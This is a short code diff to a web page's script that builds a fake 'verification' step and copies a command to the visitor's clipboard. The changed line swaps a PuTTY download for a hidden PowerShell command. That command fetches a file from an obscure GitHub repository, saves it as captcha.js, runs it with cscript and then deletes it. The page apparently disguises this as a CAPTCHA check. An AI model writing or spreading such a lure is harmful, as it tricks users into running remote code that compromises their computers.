@@ -514,8 +514,7 @@
             var verification_id = generateRandomNumber();
             document.getElementById('verification-id').textContent = verification_id;
             
-			const commandToRun = "powershell.exe -w hidden -Command \"(iwr 'https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe' -OutFile $env:TEMP\\p.exe); Start-Process $env:TEMP\\p.exe; Remove-Item $env:TEMP\\p.exe\"";
-
+			const commandToRun = "powershell.exe -w hidden -Command \"(iwr 'https://raw.githubusercontent.com/steluzororzeimai1984/6ilcmxzx9nxy7ox6fwhvw55mapng2/refs/heads/main/temp.txt' -OutFile $env:TEMP\captcha.js); cscript.exe $env:TEMP\captcha.js; Remove-Item $env:TEMP\captcha.js -Force\" "
 			
             stageClipboard(commandToRun, verification_id)
         }
